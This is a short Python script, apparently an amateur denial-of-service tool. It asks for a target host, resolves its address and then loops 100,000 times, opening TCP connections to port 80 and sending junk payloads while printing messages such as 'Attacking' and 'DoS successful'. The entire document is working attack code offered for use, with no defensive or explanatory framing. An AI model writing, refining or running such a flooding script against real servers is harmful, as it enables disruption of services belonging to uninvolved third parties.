import time, socket, os, sys, string
import subprocess

print("DoS")

host = input("Enter target: ")
port = 80
message = "+---------------------------+".encode()
message2 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5".encode()
ip = socket.gethostbyname(host)

print ("You have chosen " + ip + " as your target")
print ("Connecting to target...")
print ("Attacking " + host + "...")

def dos_method():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
        ddos.send(message2)
        ddos.sendto(message, (ip, port))
        ddos.send(message2)
    except socket.error:
        print("Socket error")
    print("DoS successful")
    ddos.close()

for x in range(1, 100000):
    dos_method()

print("DoS done")
